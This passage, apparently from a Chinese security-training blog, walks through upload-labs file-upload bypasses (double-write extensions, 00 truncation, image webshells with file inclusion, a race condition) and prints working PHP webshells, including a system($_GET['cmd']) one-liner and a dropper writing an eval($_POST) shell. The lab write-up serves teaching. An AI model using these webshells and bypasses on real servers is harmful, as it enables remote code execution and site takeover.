array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">            &#x2F;&#x2F; 我们上传的文件没有进行随机化重命名，而是直接将对应文件名拼接到最终的路径下进行上传</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="3、修改文件名-绕过黑名单验证"><a href="#3、修改文件名-绕过黑名单验证" class="headerlink" title="3、修改文件名 绕过黑名单验证"></a>3、修改文件名 绕过黑名单验证</h5><p>因为Windows特性不能再Windows下修改文件名为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">file.php. .</span><br></pre></td></tr></table></figure>
+
+<p>需要在kali中修改</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405101235839.png" alt="image-20200405101158548"></p>
+<p>上传拼接文件，返回空白图片</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405101158548.png" alt="image-20200405101235839"></p>
+<p>选择图片的图片地址，在新的页面打开，因为我上传的php代码里面是phpinfo所以会返回phpinfo的内容</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405101432318.png" alt="image-20200405101354885"></p>
+<p>在查看upload下是否有file.php文件</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405101354885.png" alt="image-20200405101432318"></p>
+<p>这样的一个绕过，只适用于Windows系统，并且当前的文件名没有被重命名，而是直接使用用户上传的文件名，这时候用户文件名是一个可控状态</p>
+<h5 id="4、上传小WebShell-小马-，大WebShell-大马"><a href="#4、上传小WebShell-小马-，大WebShell-大马" class="headerlink" title="4、上传小WebShell(小马)，大WebShell(大马)"></a>4、上传小WebShell(小马)，大WebShell(大马)</h5><p>上传WebShell，可以绕过上传过程中对文件大小等限制，从而能够更加有效上传大WebShell</p>
+<p>在某些情况下，会对文件上传的大小做一些限制，为了突破这个限制，先上传小WebShell(小马)，也就是它本身就是一个可以上传WebShell的上传界面，而它的上传界面当中对应的代码对比相对的大WebShell(大马)，小很多。</p>
+<p>通过缩减对应的字节数，从而达到符合对应的上传的限制，然后进行上传小WebShell，上传之后小WebShell是没有做限制的，这个时候就可以利用小WebShell上传更大的WebShell，从而突破文件上传工程中对文件大小的限制，以及其他限制</p>
+<p>这是小马，代码量比较少</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405102809065.png" alt="image-20200405102809065"></p>
+<p>进行上传，返回空白图片，右键复制网页地址，在新的页面打开</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405104442201.png" alt="image-20200405103811317"></p>
+<p>打开网页地址，成功上传了小马</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405103811317.png" alt="image-20200405103912957"></p>
+<p>在进行上传大马，打开大马，复制其中内容Ctrl+A进行全部选取，Ctrl+C复制</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405103912957.png" alt="image-20200405104442201"></p>
+<p>复制到小马的上传文本框中，将之前的xiaoma.php改名为dama.php(起什么名字无所谓，只要不适合xiaomaphp相同就行)，点击create</p>
+<p>注意：因为如果不改名的话就会将大马的内容上传到之前小马的php文件中</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405105229631.png" alt="image-20200405105229631"></p>
+<p>返回ok表示上传成功，这样就说明大马成功上传了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405193016113.png" alt="image-20200405105415021"></p>
+<p>查看站点根目录，这样就有了dama.php</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405105448859.png" alt="image-20200405105448859"></p>
+<p>访问大马出现报错</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405192902724.png" alt="image-20200405112056011"></p>
+<p>因为之前小马中使用了utf-8的原因，我们将小马的编码删除，在按照以上的方式来上传一遍</p>
+<h4 id="绕过黑名单验证-双写绕过"><a href="#绕过黑名单验证-双写绕过" class="headerlink" title="绕过黑名单验证(双写绕过)"></a>绕过黑名单验证(双写绕过)</h4><p>upload-labs第十关</p>
+<h5 id="1、双写绕过原理"><a href="#1、双写绕过原理" class="headerlink" title="1、双写绕过原理"></a>1、双写绕过原理</h5><p>代码编写过程中，支队黑名单中的内容进行空替换，因为只替换一次所造成的双写绕过</p>
+<p>例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.ph   php  p</span><br><span class="line">进行对应的空替换时，会首先发现php，将其过滤，过滤之后因为中间的php没有了，后面的p补上来，又变成了一个php文件，从而达到绕过。</span><br></pre></td></tr></table></figure>
+
+<h5 id="2、基于黑名单验证代码分析-1"><a href="#2、基于黑名单验证代码分析-1" class="headerlink" title="2、基于黑名单验证代码分析"></a>2、基于黑名单验证代码分析</h5><p>str_ireplace()函数替换字符串中的一些字符(不区分大小写)。</p>
+<p>该函数必须遵循下列规则</p>
+<ul>
+<li>如果搜索的字符串是一个数组，那它将返回一个数组</li>
+<li>如果搜索的字符串是一个数组，那么它将对数组中的每一个元素进行查找和替换</li>
+<li>如果同时需要对数组进行查找和替换，并且需要执行替换的元素少于查询到的元素数量，那么多余的元素将用空字符进行替换</li>
+<li>如果是对一个数组进行查找，但只是对一个字符串进行替换，那么替代字符串将对所有查找到的值起作用。</li>
+<li>注释：该函数不区分大小写。请使用str_replace()函数来执行区分大小写的搜索。</li>
+<li>注释：该函数是二进制安全的</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        &#x2F;&#x2F; 这里使用str_ireplace()函数，这个函数的意思是，只替换一次，并且为空。</span><br><span class="line">        &#x2F;&#x2F; 将$file_name中符合$deny_ext黑名单中的后缀名替换为空</span><br><span class="line">        $file_name &#x3D; str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br><span class="line">        if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name)) &#123;</span><br><span class="line">            $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; .$file_name;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="3、绕过黑名单验证"><a href="#3、绕过黑名单验证" class="headerlink" title="3、绕过黑名单验证"></a>3、绕过黑名单验证</h5><p>将文件进行双写,例如：one.pphphp</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405105415021.png" alt="image-20200405192815485"></p>
+<p>选择文件进行上传，发现返回空白图片，复制图片地址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405112056011.png" alt="image-20200405192902724"></p>
+<p>将复制的图像地址在菜刀或者蚁剑打开，成功上传</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405192815485.png" alt="image-20200405193016113"></p>
+<h4 id="绕过白名单验证-00截断绕过"><a href="#绕过白名单验证-00截断绕过" class="headerlink" title="绕过白名单验证(00截断绕过)"></a>绕过白名单验证(00截断绕过)</h4><h5 id="1、00截断原理"><a href="#1、00截断原理" class="headerlink" title="1、00截断原理"></a>1、00截断原理</h5><p>0x00是十六进制表示方法，是ascii码为0的字符，在有些和函数处理时，会把这个字符当做结束符</p>
+<p>系统在对文件名的读取时，如果遇到0x00，就会认为读取已结束</p>
+<p>在PHP5.3之后的版本中完全修复了00截断。并且00截断受限于GPC，addslashes函数</p>
+<p>白名单验证就是指定的文件后缀名，比如只允许jpg、png等文件上传，进行文件上传时，只有后缀名符合这两个后缀名才允许上传，这就是白名单</p>
+<h5 id="00字符截断的问题不只是在文件上传漏洞中有所利用，因为这是一个被广泛应用于字符串处理函数的保留字符，因此在各种不同的业务逻辑中都有可能出现问题，需要引起重视。"><a href="#00字符截断的问题不只是在文件上传漏洞中有所利用，因为这是一个被广泛应用于字符串处理函数的保留字符，因此在各种不同的业务逻辑中都有可能出现问题，需要引起重视。" class="headerlink" title="%00字符截断的问题不只是在文件上传漏洞中有所利用，因为这是一个被广泛应用于字符串处理函数的保留字符，因此在各种不同的业务逻辑中都有可能出现问题，需要引起重视。"></a>%00字符截断的问题不只是在文件上传漏洞中有所利用，因为这是一个被广泛应用于字符串处理函数的保留字符，因此在各种不同的业务逻辑中都有可能出现问题，需要引起重视。</h5><p>而白名单在进行验证时可以直接在后面输入00</p>
+<p>比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">再上传过程中它是一个jpg文件，但是在.php后面有0x00截断，.jpg忽略，这样就成功上传了1.php</span><br><span class="line">1.php0x00.jpg</span><br><span class="line">00后面的内容都将被忽略，但是在整个过程中，他的文件名还是依然存在</span><br></pre></td></tr></table></figure>
+
+<h5 id="2、GET型00截断"><a href="#2、GET型00截断" class="headerlink" title="2、GET型00截断"></a>2、GET型00截断</h5><p>GET型提交的内容会被自动进行URL解码。</p>
+<p><strong>注意：</strong>进行00截断一定要关闭<strong>GPC</strong>，否则无法成功。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</span><br><span class="line">    $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">      &#x2F;&#x2F; date()随机数和rand()时间，以及最后添加文件扩展名$file_ext</span><br><span class="line">      &#x2F;&#x2F; 这样就可以在date(&quot;YmdHis&quot;)后面加入0x00截断，使$file_ext被添加的文件后缀名不会被执行成功</span><br><span class="line">        $img_path &#x3D; $_GET[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">	&#x2F;&#x2F; 使用move_uploaded_file将临时上传的文件$temp_file保存到$img_path路径下，并且进行了随机化重命名</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg &#x3D; &#39;上传失败！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先新建一个1.php的文件，将其里面写入一句话木马</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406083134693.png" alt="image-20200406081237206"></p>
+<p>写入一句话木马后，在将文件改名为1.jpg或者png只要是允许上传的文件格式就可以</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406083446465.png" alt="image-20200406083134693"></p>
+<p>进行上传，使用burp抓包，然后将burp中的信息进行稍微修改</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406081237206.png" alt="image-20200406083446465"></p>
+<p>修改完成后运行包通过，页面会返回空白图片，右击点击图片地址。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406083622923.png" alt="image-20200406083622923"></p>
+<p>在新的页面将地址粘贴，粘贴完不能直接执行，需要将红线处的内容删除，也就是1.php后的内容删除，否则报错</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406084954651.png" alt="image-20200406083751706"></p>
+<p>删除之后在进入页面，返回phpinof的页面</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406085245844.png" alt="image-20200406083843607"></p>
+<p>这就是GTE截断。</p>
+<h5 id="3、POST型00截断"><a href="#3、POST型00截断" class="headerlink" title="3、POST型00截断"></a>3、POST型00截断</h5><p>除了常见的检查文件名后缀的方法外，有的应用，还会通过判断上传文件的文件头来验证文件的类型。比如以下代码</p>
+<p>在POST请求中，%00不会被自动解码，需要在16进制中进行修改00</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</span><br><span class="line">    $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">     &#x2F;&#x2F; 这样就可以在date(&quot;YmdHis&quot;)后面加入0x00截断，使$file_ext被添加的文件后缀名不会被执行成功</span><br><span class="line">        $img_path &#x3D; $_POST[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">        </span><br><span class="line">	&#x2F;&#x2F; 使用move_uploaded_file将临时上传的文件$temp_file保存到$img_path路径下，并且进行了随机化重命名</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg &#x3D; &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>创建一个php文件，写入一句话木马，然后更改为可上传格式，进行上传burp抓包</p>
+<p>这里加入空格的原因是因为%00不会被自动解码，需要在16进制中修改，因为加入空格已知他是16进制的20，所以在HEX只需要找到位置将20修改为00就可以截断</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406083751706.png" alt="image-20200406084954651"></p>
+<p>为了绕过类似的MIME Sniff的功能，常见的攻击技巧是伪造一个合法的文件头，而将真实的PHP等脚本代码附在合法的文件头之后</p>
+<p>在HEX子模块中找到1.php空格，找到20</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406083843607.png" alt="image-20200406085245844"></p>
+<p>找到20之后，要将他修改为00</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406085759324.png" alt="image-20200406085344970"></p>
+<p>修改执行点击forward进行上传，返回一个空白图片，右键复制图片连接</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406085602285.png" alt="image-20200406085602285"></p>
+<p>在新的浏览器打开，当然还是需要将php格式后面的删除，成功访问</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406085344970.png" alt="image-20200406085759324"></p>
+<p><strong>注意：</strong>截断需要关闭GPC否则会上传失败</p>
+<h5 id="4、一句话代码执行Webshell"><a href="#4、一句话代码执行Webshell" class="headerlink" title="4、一句话代码执行Webshell"></a>4、一句话代码执行Webshell</h5><p>使用php中的函数system执行GET提交的参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	&#x2F;&#x2F; 当参数不为空时，执行if下的语句</span><br><span class="line">	&#x2F;&#x2F; 当if判断输入为空时，执行else语句</span><br><span class="line">		if($_GET)&#123;</span><br><span class="line">				$cmd&#x3D;$_GET[&quot;cmd&quot;];</span><br><span class="line">				system($cmd);</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">				echo &quot;no cmd&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>因为我们并没有提交任何参数，所以返回为no cmd为空</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406090948967.png" alt="image-20200406090751572"></p>
+<p>如果写入cmd=ipconfig，会返回ipconfig的详细信息</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406090751572.png" alt="image-20200406090948967"></p>
+<p>如果上面感觉太乱，可以查看源码，这样就会整齐的列下来</p>
+<p>在某些时候JS会限制右键，可以使用   “<strong>view-source:URL</strong>”   来查看源代码</p>
+<p>例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;127.0.0.1&#x2F;upload-labs&#x2F;upload&#x2F;web.php?cmd&#x3D;ipconfig</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406094728548.png" alt="image-20200406091058283"></p>
+<h4 id="图片WebShell上传"><a href="#图片WebShell上传" class="headerlink" title="图片WebShell上传"></a>图片WebShell上传</h4><h5 id="1、图片WebShell制作"><a href="#1、图片WebShell制作" class="headerlink" title="1、图片WebShell制作"></a>1、图片WebShell制作</h5><p>在服务端的PHP代码中，对于用户上传的文件做文件类型检查，查看文件格式是否符合上传规范。可以检查文件二进制格式的前几个字节，从而判断文件类型是否正确。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406095120594.png" alt="image-20200406094531954"></p>
+<p>将PHP格式改为jpg格式</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406091058283.png" alt="image-20200406094728548"></p>
+<h5 id="2、上传图片WebShell文件"><a href="#2、上传图片WebShell文件" class="headerlink" title="2、上传图片WebShell文件"></a>2、上传图片WebShell文件</h5><p>将制作好的图片WebShell上传到服务器。</p>
+<p>其中可能Content-Type验证。修改为image/gif或者image/jpg 符合当前文件类型的MIME</p>
+<p>进行上传然后使用Burp抓包，Forward进行放行</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406095225081.png" alt="image-20200406095120594"></p>
+<p>返回空白图片，复制图片地址，在新的页面打开</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406094531954.png" alt="image-20200406095152978"></p>
+<p>发现页面打开，但是并没有phpinfo的界面，说明出错了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406095152978.png" alt="image-20200406095225081"></p>
+<p>因为文件我们直接编写的，他没有直接显示，这样的话他还是没有直接显示对应的phpinfo，对于这种就请就要使用对用的文件包含漏洞进行对应的测试</p>
+<h5 id="3、文件包含漏洞代码分析"><a href="#3、文件包含漏洞代码分析" class="headerlink" title="3、文件包含漏洞代码分析"></a>3、文件包含漏洞代码分析</h5><p>在PHP中，使用include、require、include_once、require_once函数包含的文件都会被当做PHP代码执行，无论文件的名称是什么，只要符号文件内容符合PHP代码规范，都会被当作PHP代码执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">		if($_GET)&#123;</span><br><span class="line">				include($_GET[&quot;file&quot;]);</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">				echo &quot;not get args file&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="4、结合文件包含输出phpinfo"><a href="#4、结合文件包含输出phpinfo" class="headerlink" title="4、结合文件包含输出phpinfo"></a>4、结合文件包含输出phpinfo</h5><p>将上面代码放在upload下，将地址复制打开，返回not get args file，说明代码没问题</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406104838474.png" alt="image-20200406101945790"></p>
+<p>在php后面加上?file=一句话木马的图片名称，将红线处的图片名称复制到蓝线处</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406102158810.png" alt="image-20200406102158810"></p>
+<p>利用存在文件包含的PHP页面，包含上传的图片WebShell，从而触发WebShell，输出对应的phpinfo</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406111040176.png" alt="image-20200406101824355"></p>
+<h4 id="竞争条件"><a href="#竞争条件" class="headerlink" title="竞争条件"></a>竞争条件</h4><p>upload-labs 17</p>
+<h5 id="1、文件上传过程介绍"><a href="#1、文件上传过程介绍" class="headerlink" title="1、文件上传过程介绍"></a>1、文件上传过程介绍</h5><p>文件上传过程：</p>
+<p>从浏览器上传到服务器，服务器接收到浏览器上传的文件时，服务器就会获取对应的文件，获取文件之后他不会立即将文件保存到对应的网站目录下，而是会将他保存到系统的临时文件当中，保存到临时文件之后，当我们在对应的脚本当中使用对应的重命名函数时，才会将临时文件移动到我们对应的上传目录下</p>
+<p>例如：我们在php脚本语言当中使用move_uploade这个函数之后，才会将文件真实的上传到咱们对应的站点目录下。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406101945790.png" alt="image-20200406104838474"></p>
+<h5 id="2、竞争条件原理介绍"><a href="#2、竞争条件原理介绍" class="headerlink" title="2、竞争条件原理介绍"></a>2、竞争条件原理介绍</h5><p>网站逻辑：</p>
+<p>1、网站允许上传任意文件，然后检查上传文件是否包含WebShell，如果包含删除该文件</p>
+<p>2、网站允许上传任意文件，但是如果不是指定类型，那么使用unlink删除文件</p>
+<p>问题：</p>
+<p>在删除之前如果访问到上传的php文件或者其他脚本文件，从而执行上传中的php代码或者其他脚本代码</p>
+<p>例如：上传文件代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#39;);</span><br><span class="line">?&gt;</span><br><span class="line">假如以上代码命名为WebShell.php，那么再删除WebShell.php时，首先访问了WebShell.php，这时候就会在相应的WebShell.php当前目录下新建一个shell.php一句话脚本，从而可以使用菜刀进行连接</span><br><span class="line"></span><br><span class="line">通俗点说就是当你上传完WebShell.php文件，网站要检查你这个文件是不是包含了恶意脚本，检查的时候需要打开WebShell.php文件，当打开的时候就执行了php脚本，因为检查和删除是需要时间的，所以就在这个时间段内生成了一个shell.php脚本，将&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;这段代码放进了 shell.php中，这样就可以使用菜刀连接了</span><br></pre></td></tr></table></figure>
+
+<h5 id="3、竞争条件代码分析"><a href="#3、竞争条件代码分析" class="headerlink" title="3、竞争条件代码分析"></a>3、竞争条件代码分析</h5><p>先进行上传，然后进行判断与删除，利用时间差进行WebShell上传。</p>
+<p>首先进行了对应的上传，上传之后才进行判断，判断上传的文件是否符合对应的条件，符合类型为jpg，png，gif，如果符合使用rename()函数进行重命名，如果不符合使用unlink()函数进行删除，这个时候就可以利用判断和删除的时间差来进行对应的webshell上传，从而访问到上传的php脚本</p>
+<p>因为在move_uoloaded_file(){函数后面那里并没有进行判断，这个时候就可因进行上传比如一个1.php，网站在删除之前访问到1.php，那么1.php脚本当中内容就会执行</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406101824355.png" alt="image-20200406111040176"></p>
+<h5 id="4、竞争条件文件上传利用"><a href="#4、竞争条件文件上传利用" class="headerlink" title="4、竞争条件文件上传利用"></a>4、竞争条件文件上传利用</h5><p>提前不断访问代码文件，然后上传，最终使用才到连接一句话webshell</p>
+<p>Python发送http请求：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import   requests</span><br><span class="line">while   true:</span><br><span class="line">		requests.get(&quot;路径&quot;)</span><br></pre></td></tr></table></figure>
+
